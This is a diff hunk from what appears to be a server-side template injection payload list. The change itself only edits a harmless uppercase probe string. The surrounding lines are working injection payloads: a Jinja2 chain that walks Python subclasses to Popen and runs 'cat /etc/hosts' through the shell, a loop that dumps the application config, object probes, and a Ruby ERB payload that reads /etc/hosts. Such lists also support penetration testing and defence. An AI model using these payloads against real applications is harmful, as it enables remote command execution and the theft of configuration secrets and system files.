@@ -16,7 +16,7 @@ ${{3*3}}
 {{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
 {{''.__class__.__base__.__subclasses__()[227]('cat /etc/hosts', shell=True, stdout=-1).communicate()}}
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
-{{'a'.toUpperCase()}}
+{{'electric_yellow'.toUpperCase()}}
 {{ request }}
 {{self}}
 <%= File.open('/etc/hosts').read %>
